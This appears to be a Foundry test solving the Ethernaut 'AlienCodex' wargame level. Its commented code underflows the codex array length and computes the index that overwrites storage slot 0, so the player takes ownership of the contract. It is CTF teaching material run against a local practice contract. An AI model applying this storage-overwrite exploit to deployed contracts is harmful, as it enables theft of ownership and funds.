// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

contract AlienCodexTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testAlienCodexHack() public {
        /*****************
         * Factory setup *
         *************** */
        vm.startPrank(player);
        /*
         * Here the set up is fairly different, we need to stick to 0.5.0 version.
         * we can have access to the abi
         * Thanks to vm we can get the code (returns the creation bytecode )
         * Then we can create it with assembly
         */
        bytes memory alienCodeBytesCode = abi.encodePacked(
            vm.getCode("./src/AlienCodex/AlienCodex.json")
        );
        // in order to do so, don't forget to add "fs_permissions = [{ access = "read", path = "./src"}]" to foundry.toml
        address alienCodexContract;
        assembly {
            alienCodexContract := create(
                0,
                add(alienCodeBytesCode, 0x20),
                mload(alienCodeBytesCode)
            )
        }

        /*****************
         *    Attack     *
         *************** */
        /*
         * Ok so now we have our alienCode contract.
         * 1) we call the make_contact function to be able to pass the "contacted" modifier after
         * 2) we want to call "retract" function as all the contract stored in the bytes32[] codex.
         *   calling retract making it underflow
         * 3) we need to compute the codex index corresponding to slot 0
         *   2²⁵⁶ - 1 - uint(keccak256(1)) + 1 = 2²⁵⁶ - uint(keccak256(1))
         *
         *   then address left padded with 0 to total 32 bytes
         * 4) leftPaddedAddress will padd our addres with 0 to ta total of 32bytes
         *
         * Keep in mind the storage slot allocation:
         * SLOT0 -> contact bool + owner address
         * SLOT1 -> codex.lenght
         * keccak256(1) -> codex[0]
         * keccak256(1) + 1 -> codex[1]
         * ...
         * SLOT0 codex[2²⁵⁶ - 1 - uint(keccak256(1)) + 1] --> can write slot 0!
         */
        // -- 1 --
        (bool successMakeContact, ) =alienCodexContract.call(abi.encodeWithSignature("make_contact()"));
        require(successMakeContact);
        // -- 2 --
        (bool successRetract, ) =alienCodexContract.call(abi.encodeWithSignature("retract()"));
        require(successRetract);
        // -- 3 --
        uint codexIndexForSlotZero = ((2**256) - 1) -
            uint(keccak256(abi.encode(1))) +
            1;
        // -- 4 --
        bytes32 leftPaddedAddress = bytes32(abi.encode(player));

        // must be uint256 in function signature not uint
        // call revise with codex index and content which will set you as the owner
        (bool succcessRevise,) = alienCodexContract.call(
            abi.encodeWithSignature(
                "revise(uint256,bytes32)",
                codexIndexForSlotZero,
                leftPaddedAddress
            )
        );
        require(succcessRevise);

        /******************
         *Level Submission*
         ***************  */
        (bool successOwner, bytes memory data) = alienCodexContract.call(
            abi.encodeWithSignature("owner()")
        );
        require(successOwner);
        address refinedData = address(
            uint160(bytes20(uint160(uint256(bytes32(data)) << 0)))
        );

        vm.stopPrank();
        assertEq(refinedData, player);
    }
}
